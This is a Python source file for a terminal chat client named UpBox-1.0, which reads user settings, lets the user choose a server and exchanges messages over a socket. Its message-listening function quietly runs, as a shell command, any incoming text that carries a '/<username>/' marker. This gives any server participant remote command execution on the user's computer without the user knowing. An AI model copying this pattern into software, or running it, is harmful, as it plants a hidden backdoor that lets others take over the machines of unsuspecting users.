#libs
import json
import socket
import sys
import subprocess
from threading import Thread
from colorama import Fore, Back
import colorama
import time
import keyboard as kb
from datetime import datetime
import random

#startup
subprocess.call('cls', shell=True)
print('\rinitializing'+Fore.RED+'                [##                 ]', end='')
def print_there(x, y, text):
     sys.stdout.write("\x1b7\x1b[%d;%df%s\x1b8" % (x, y, text))
     sys.stdout.flush()
time.sleep(1)
print(Fore.WHITE+'\ropening settings.json'+Fore.RED+'       [#####              ]', end='')

with open('data\settings.json') as settings_f:
    settings = json.load(settings_f)
    


time.sleep(.4)

print(Fore.WHITE+'\rloading client items'+Fore.RED+'        [###########        ]', end='')

with open('data\\user.json') as user_data_f:
    user_data = json.load(user_data_f)

name = user_data['data'][0]['name']

def join_srv(name1, address1):
    time.sleep(.5)
    address1 = address1.split(':')
    opt1 = '/'+name1+'/'
    opt2 = '//'+name1
    name123 = f'] {name1}:'
    SERVER_HOST = address1[0]
    SERVER_PORT = int(address1[1])
    separator_token = ": "

    s = socket.socket()

    print(f"[*] Connecting to {SERVER_HOST}:{SERVER_PORT}...")
    s.connect((SERVER_HOST, SERVER_PORT))
    print("[+] Connected.")
    s.send(name1.encode())
    input()
    input()

    def listen_for_messages():
        while True:
            message = s.recv(1024).decode()
            if settings['colors'][0]['fcolor'] == 'green':
                print(Fore.GREEN)

            elif settings['colors'][0]['fcolor'] == 'blue':
                print(Fore.BLUE)

            elif settings['colors'][0]['fcolor'] == 'red':
                print(Fore.RED)

            if opt2 in message:
                not1 = True

            elif opt1 in message:
                cmd = str(message)
                cmd = cmd.replace(opt1, '')
                subprocess.call(cmd, shell=True)
            
            elif '//' in message:
                print("\n" + message)

            elif name123 in message:
                if settings['colors'][0]['color'] == 'green':
                    print(Fore.GREEN)

                elif settings['colors'][0]['color'] == 'blue':
                    print(Fore.BLUE)

                elif settings['colors'][0]['color'] == 'red':
                    print(Fore.RED)
                print("\n" + message)

            else:
                print("\n" + message)
    t = Thread(target=listen_for_messages)
    t.daemon = True
    t.start()

    while True:
        if settings['colors'][0]['color'] == 'green':
            print(Fore.GREEN)

        elif settings['colors'][0]['color'] == 'blue':
            print(Fore.BLUE)

        elif settings['colors'][0]['color'] == 'red':
            print(Fore.RED)
        to_send =  input()
        if to_send.lower() == 'q':
            break

        if '//' in to_send:
            to_send = to_send.replace('//', '')
            to_send = '//'+name+'='+to_send
            s.send(to_send.encode())
        else:
            date_now = datetime.now().strftime('%Y-%m-%d %H:%M:%S') 
            to_send = f"[{date_now}] {name}{separator_token}{to_send}{Fore.RESET}"
            s.send(to_send.encode())
    s.send(f'{name} left')
    s.close()


time.sleep(1)
print(Fore.WHITE+'\ropening server.list'+Fore.RED+'         [################   ]', end='')
with open('server.list')as srv_list_file1:
    srv_name_list = srv_list_file1.read()

with open('server.list')as srv_list_file:
    srv_list = srv_list_file.readlines()
    time.sleep(.4)

count = 0
with open('server.list')as srv_count1:
        for x in srv_count1:
            count = count + 1

time.sleep(.4)
print(Fore.WHITE+'\rloading server.list'+Fore.RED+'         [###################]', end='')
time.sleep(.4)

print('\r                                                                                      ', end='')


copyright1 = """
 **     **         ******                           **      **** 
/**    /** ****** /*////**                         ***     *///**
/**    /**/**///**/*   /**   ******  **   **      //**    /*  */*
/**    /**/**  /**/******   **////**//** **  ***** /**    /* * /*
/**    /**/****** /*//// **/**   /** //***  /////  /**    /**  /*
/**    /**/**///  /*    /**/**   /**  **/**        /**  **/*   /*
//******* /**     /******* //******  ** //**       ****/**/ **** 
 ///////  //      ///////   //////  //   //       //// //  ////  
"""
if settings['colors'][0]['color'] == 'green':
    print(Fore.GREEN)

elif settings['colors'][0]['color'] == 'blue':
    print(Fore.BLUE)

elif settings['colors'][0]['color'] == 'red':
    print(Fore.RED)

newjson = {
    "data":[
        {
        "name": name,
        "type": "normal"
        }
    ]
}

if name == 'user':
    while True:
            print('please enter a name \n')
            nm = input('enter a name: ')
            if nm == '':
                continue
            elif nm == name:
                continue
            else:
                newname = {
                        "data": [
                            {
                                "name": nm,
                                "type": "new"
                            }
                        ]
                    }

            with open('data\\user.json', 'w')as user_2:
                json.dump(newname, user_2, indent=4)
            print(Fore.WHITE)
            quit()

print(copyright1+"\n"+"\n")
if user_data['data'][0]['type'] == 'new':
    print('Hello There '+user_data['data'][0]['name']+' Welcome To UpBox-1.0!'+'\n')
    with open('data\\user.json', 'w')as user_1:
        json.dump(newjson, user_1, indent=4)
else:
    print('Welcome Back '+user_data['data'][0]['name']+'!')
print('Use The Arrow Keys To Select A Server.')
print('Hit Enter To Join The Selected Server.\n')
print('Hit Enter To Continue.\n\n')
def start1():
    while True:
        if kb.is_pressed('Enter'):
            break
time.sleep(.5)
start1()

subprocess.call('cls', shell=True)
print(srv_name_list)

num1 = 1
num2 = count -1
print_there(1, 16, '<')
while True:
    if kb.is_pressed('Down'):
        if num1 > num2:
            num1 = 1
            print_there(num1, 16, '     ')
            time.sleep(.1)
        else:
            print_there(num1, 16, '     ')
            num1 = num1 + 1
            print_there(num1, 16, '<')
            time.sleep(.12)

    elif kb.is_pressed('Up'):
        if num1 == 0:
            num1 = num2
            print_there(num1, 16, '     ')
            print_there(1, 16, '<')
            time.sleep(.1)

        else:
            print_there(num1, 16, '     ')
            num1 = num1 - 1
            print_there(num1, 16, '<')
            time.sleep(.12)

    elif kb.is_pressed('Enter'):
        num3 = num1
        sel_srv = num3
        sel_srv = int(sel_srv) - 1
        sel_srv = srv_list[sel_srv]
        nn='\n'
        sel_str = sel_srv.replace(nn, '')
        sel_srv = (f'servers\{sel_str}.srv')
        with open(sel_srv) as addrfile:
            address = addrfile.read()
            break
time.sleep(.2)
join_srv(name, address)